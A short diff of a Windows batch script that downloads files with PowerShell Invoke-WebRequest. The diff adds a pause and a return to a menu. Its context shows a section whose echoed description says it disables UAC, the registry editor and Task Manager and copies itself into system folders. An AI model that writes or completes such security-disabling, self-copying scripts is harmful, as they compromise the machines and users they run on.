@@ -156,6 +156,9 @@ move /Y "%name5%" "%targetDir%\%name5%"
 powershell -Command "Invoke-WebRequest -Uri '%img6%' -OutFile '%name6%'"
 move /Y "%name6%" "%targetDir%\%name6%"
 
+pause
+goto MENU
+
 :LEVEL1
 cls
 echo this part will disable UAC and regedit and task mgr and would clone the batch itself to system folders
